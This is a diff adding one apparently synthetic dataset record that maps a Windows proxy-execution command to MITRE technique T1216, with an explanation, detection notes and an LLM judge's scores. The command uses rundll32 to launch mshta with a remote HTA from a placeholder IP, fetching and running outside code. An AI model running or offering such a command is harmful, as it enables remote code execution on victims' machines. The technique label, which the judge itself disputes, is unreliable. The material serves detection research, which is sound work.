@@ -1,0 +1,37 @@
+{
+  "technique_id": "T1216",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "rundll32.exe shell32.dll,ShellExec_RunDLL mshta.exe http://198.51.100.22/update.hta",
+  "explanation": "Uses rundll32 to call ShellExec_RunDLL as a proxy to launch mshta with a remote HTA, chaining trusted components to execute external content.",
+  "rationale_steps": [
+    "PowerShell starts rundll32 with ShellExec_RunDLL export from shell32.dll.",
+    "ShellExec_RunDLL spawns mshta pointing to a remote HTA for execution.",
+    "The chain relies on signed Windows binaries; unusual pairing of ShellExec_RunDLL with mshta and remote URLs is the detection point."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1216-fce25ec9-c35b6d49",
+  "source_prompt_hash": "fce25ec9",
+  "timestamp_utc": "2025-09-30T07:05:43.585605Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed rundll32 invocation with valid arguments and no quoting or parsing issues for PowerShell/CMD.",
+        "semantic_score": 3,
+        "semantic_justification": "While it plausibly proxies execution to mshta to run a remote HTA, this aligns more with Signed Binary Proxy Execution (T1218, mshta/rundll32) than System Script Proxy Execution (T1216), and the URL uses a documentation-only IP.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T21:24:18.033725Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
